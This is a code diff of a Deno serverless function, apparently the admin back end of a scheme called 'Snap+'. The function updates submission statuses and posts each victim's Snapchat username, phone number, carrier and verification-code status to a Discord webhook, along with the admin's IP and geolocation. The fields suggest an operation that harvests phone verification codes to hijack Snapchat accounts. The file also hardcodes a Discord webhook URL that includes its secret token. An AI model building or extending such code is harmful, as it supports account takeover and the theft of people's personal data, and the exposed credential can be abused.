@@ -3,12 +3,11 @@ import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 const LOG_WEBHOOK = "https://discord.com/api/webhooks/1520075027377164368/SRDgc2Ncec6qbVyFYKvD6oaWcNHZJC_HyisJS3hZPF6RALBe4LWOTlEnAxgWHZc3IZPV";
 
 const actionLabels = {
-  valid: { label: "✅ Code validé par l'admin", color: 0x2ECC71 },
-  wrong: { label: "❌ Mauvais numéro (admin)", color: 0xE74C3C },
+  valid: { label: "✅ Code validé par un admin", color: 0x2ECC71 },
+  wrong: { label: "❌ Mauvais numéro", color: 0xE74C3C },
   expired: { label: "⏰ Code expiré / renvoyé", color: 0xF39C12 },
   wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB },
   code_ready: { label: "📤 Code envoyé par un admin", color: 0xFFD700 },
-  blacklist: { label: "🚫 Utilisateur blacklisté", color: 0x95A5A6 },
 };
 
 const statusMap = {
@@ -31,13 +30,14 @@ Deno.serve(async (req) => {
     const base44 = createClientFromRequest(req);
     await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
 
-    // Fetch submission details for the log
+    // Fetch submission details
     const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
 
-    // Get admin IP info
+    // Get admin IP & user agent
     const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
     const userAgent = req.headers.get("user-agent") || "";
 
+    // Detect browser
     let browser = "Inconnu";
     if (userAgent.includes("Edg/")) browser = "Edge";
     else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) browser = "Opera";
@@ -45,11 +45,12 @@ Deno.serve(async (req) => {
     else if (userAgent.includes("Firefox")) browser = "Firefox";
     else if (userAgent.includes("Safari")) browser = "Safari";
 
-    let device = "Desktop";
+    // Detect device
+    let device = "Inconnu";
     if (/iPhone|iPad|iPod/.test(userAgent)) device = "iPhone/iPad";
-    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "📱 Téléphone";
-    else if (/Android/.test(userAgent)) device = "📱 Tablette";
-    else device = "💻 PC";
+    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "Téléphone Android";
+    else if (/Android/.test(userAgent)) device = "Tablette Android";
+    else if (/Windows|Macintosh|Linux/.test(userAgent)) device = "Desktop";
 
     // Geolocate admin IP
     let country = "Inconnue";
@@ -76,14 +77,14 @@ Deno.serve(async (req) => {
         { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
         { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
         { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
-        { name: "🌍 Pays", value: country, inline: true },
-        { name: "🏙️ Ville", value: city, inline: true },
         { name: "🌐 Navigateur", value: browser, inline: true },
+        { name: "🏙️ Ville", value: city, inline: true },
+        { name: "🌍 Pays", value: country, inline: true },
         { name: "💾 Appareil", value: device, inline: true },
         { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
         { name: "🕐 Heure", value: heureStr, inline: true },
       ],
-      footer: { text: `Admin Dashboard • Snap+ • ID: ${submissionId}` },
+      footer: { text: `Admin Dashboard • Snap+` },
       timestamp: now.toISOString(),
     };
 
